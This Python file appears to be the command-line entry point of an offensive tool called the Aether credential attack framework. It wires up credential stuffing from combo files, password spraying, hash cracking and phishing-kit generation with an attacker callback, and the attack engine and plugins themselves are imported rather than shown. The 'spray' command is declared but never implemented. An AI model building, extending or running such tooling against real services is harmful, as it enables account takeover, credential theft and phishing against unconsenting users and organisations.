#!/usr/bin/env python3
import asyncio
import argparse
import sys

from .core.engine import AttackEngine, PluginRegistry
from .phishing.generator import PhishingGenerator
from .offline.cracker import HashCracker


def main():
    parser = argparse.ArgumentParser(description="Aether - Credential Attack Framework")
    parser.add_argument("-p", "--plugin", help="Plugin name")
    parser.add_argument("-t", "--target", help="Target URL/host")
    parser.add_argument("-c", "--combos", help="Combo file (user:pass)")
    parser.add_argument("-u", "--users", help="User list file")
    parser.add_argument("-w", "--wordlist", help="Password list file")
    
    subparsers = parser.add_subparsers(dest="command")
    
    # Stuff command
    stuff = subparsers.add_parser("stuff", help="Credential stuffing")
    stuff.add_argument("-f", "--file", required=True, help="Combo file")
    
    # Spray command
    spray = subparsers.add_parser("spray", help="Password spray")
    
    # Crack command
    crack = subparsers.add_parser("crack", help="Hash cracking")
    crack.add_argument("--hash-file", required=True)
    crack.add_argument("-a", "--algorithm", default="md5")
    
    # Phish command
    phish = subparsers.add_parser("phish", help="Generate phishing kit")
    phish.add_argument("--template", required=True)
    phish.add_argument("--callback", required=True)
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    asyncio.run(run_command(args))


async def run_command(args):
    engine = AttackEngine()
    
    # Register all plugins
    from .plugins import PLUGINS
    for plugin in PLUGINS:
        engine.registry.register(plugin)
    
    if args.command == "stuff":
        # Load combos
        combos = []
        with open(args.file) as f:
            for line in f:
                if ':' in line:
                    u, p = line.strip().split(':', 1)
                    combos.append((u, p))
        
        results = await engine.credential_stuffing(args.plugin, args.target, combos)
        print(f"\nResults: {results['successful']}/{results['attempted']} successful")
        
    elif args.command == "crack":
        cracker = HashCracker({"wordlist": args.wordlist or "wordlist.txt"})
        results = await cracker.crack_file(args.hash_file, args.algorithm)
        for h, p in results.items():
            status = f"= {p}" if p else "NOT CRACKED"
            print(f"{h} {status}")
            
    elif args.command == "phish":
        gen = PhishingGenerator()
        path = gen.generate(args.template, args.callback)
        print(f"[+] Phishing kit generated: {path}")


if __name__ == "__main__":
    main()